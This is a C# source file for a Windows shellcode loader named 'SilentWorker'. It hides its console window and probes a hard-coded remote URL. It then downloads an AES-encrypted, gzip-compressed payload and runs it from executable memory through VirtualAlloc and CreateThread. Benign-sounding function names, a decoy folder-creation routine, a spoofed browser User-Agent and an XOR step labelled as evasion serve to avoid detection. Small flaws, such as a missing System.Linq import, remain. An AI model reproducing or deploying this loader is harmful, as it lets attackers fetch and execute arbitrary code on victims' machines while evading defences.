using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Threading;

namespace SilentWorker
{
    class TaskExecutor
    {
        private static string BaseUrl = "https://www.tecnologico.org/d2fc1b6a458f";
        private static string AesKey = "9ae0c8e048d89fb3";
        private static string AesIV = "789ca1a73299c6e0";

        private static List<string> FileExtensions = new List<string>
        {
            ".html", ".css", ".js", ".json", ".xml", ".php", ".asp", ".aspx",
            ".jsp", ".cgi", ".pl", ".rss", ".svg", ".xhtml", ".cfm",
            ".axd", ".asx", ".asmx", ".ashx", ".swf"
        };

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        private const int SW_HIDE = 0;

        private delegate IntPtr AllocateSpace(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate IntPtr LaunchTask(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate uint WaitTask(IntPtr hHandle, uint dwMilliseconds);

        private static byte[] ProcessPayload(byte[] input)
        {
            byte[] key = Encoding.UTF8.GetBytes(AesKey);
            byte[] iv = Encoding.UTF8.GetBytes(AesIV);

            using (Aes cipher = Aes.Create())
            {
                cipher.Key = key;
                cipher.IV = iv;
                cipher.Padding = PaddingMode.None;

                ICryptoTransform transformer = cipher.CreateDecryptor(cipher.Key, cipher.IV);
                using (MemoryStream inputStream = new MemoryStream(input))
                using (MemoryStream outputStream = new MemoryStream())
                using (CryptoStream cryptoStream = new CryptoStream(inputStream, transformer, CryptoStreamMode.Read))
                {
                    cryptoStream.CopyTo(outputStream);
                    return outputStream.ToArray();
                }
            }
        }

        private static byte[] ExtractData(byte[] input)
        {
            using (MemoryStream outputStream = new MemoryStream())
            using (MemoryStream inputStream = new MemoryStream(input))
            using (GZipStream expander = new GZipStream(inputStream, CompressionMode.Decompress, true))
            {
                expander.CopyTo(outputStream);
                return outputStream.ToArray();
            }
        }

        private static async Task<byte[]> RetrieveData(string url)
        {
            try
            {
                using (var client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                    await Task.Delay(new Random().Next(500, 1500));
                    HttpResponseMessage response = await client.GetAsync(url);
                    response.EnsureSuccessStatusCode();
                    return await response.Content.ReadAsByteArrayAsync();
                }
            }
            catch
            {
                return null;
            }
        }

        private static async Task<string> LocateValidResource()
        {
            foreach (var ext in FileExtensions)
            {
                string target = BaseUrl + ext;
                try
                {
                    using (var client = new HttpClient())
                    {
                        client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                        HttpResponseMessage response = await client.GetAsync(target);
                        if (response.IsSuccessStatusCode)
                        {
                            return target;
                        }
                    }
                }
                catch
                {
                    continue;
                }
            }
            return null;
        }

        private static void DeployTask(byte[] data)
        {
            if (data == null || data.Length <= 16) return;

            byte[] payload = data.Skip(16).ToArray();
            byte[] decrypted = ProcessPayload(payload);
            byte[] shellcode = ExtractData(decrypted);

            IntPtr hLib = LoadLibrary("kernel32.dll");
            if (hLib == IntPtr.Zero) return;

            var alloc = Marshal.GetDelegateForFunctionPointer<AllocateSpace>(GetProcAddress(hLib, "VirtualAlloc"));
            var launch = Marshal.GetDelegateForFunctionPointer<LaunchTask>(GetProcAddress(hLib, "CreateThread"));
            var wait = Marshal.GetDelegateForFunctionPointer<WaitTask>(GetProcAddress(hLib, "WaitForSingleObject"));

            IntPtr memAddr = alloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            if (memAddr == IntPtr.Zero) return;

            // Ofuscación intermedia para evasión
            byte[] temp = new byte[shellcode.Length];
            for (int i = 0; i < shellcode.Length; i++)
            {
                temp[i] = (byte)(shellcode[i] ^ 0xAA);
            }
            Marshal.Copy(temp, 0, memAddr, temp.Length);

            for (int i = 0; i < shellcode.Length; i++)
            {
                Marshal.WriteByte(memAddr + i, (byte)(Marshal.ReadByte(memAddr + i) ^ 0xAA));
            }

            IntPtr hThread = launch(IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread != IntPtr.Zero)
            {
                wait(hThread, 0xFFFFFFFF);
            }
        }

        private static void SimulateWork()
        {
            string[] dummyData = new string[] { "log", "temp", "data" };
            foreach (var item in dummyData)
            {
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), item);
                if (!Directory.Exists(path)) Directory.CreateDirectory(path);
            }
        }

        public static async Task Main(string[] args)
        {
            IntPtr console = GetConsoleWindow();
            if (console != IntPtr.Zero)
            {
                ShowWindow(console, SW_HIDE);
            }

            SimulateWork();
            string validUrl = await LocateValidResource();
            if (!string.IsNullOrEmpty(validUrl))
            {
                byte[] payload = await RetrieveData(validUrl);
                if (payload != null && payload.Length > 0)
                {
                    DeployTask(payload);
                }
            }
        }
    }
}
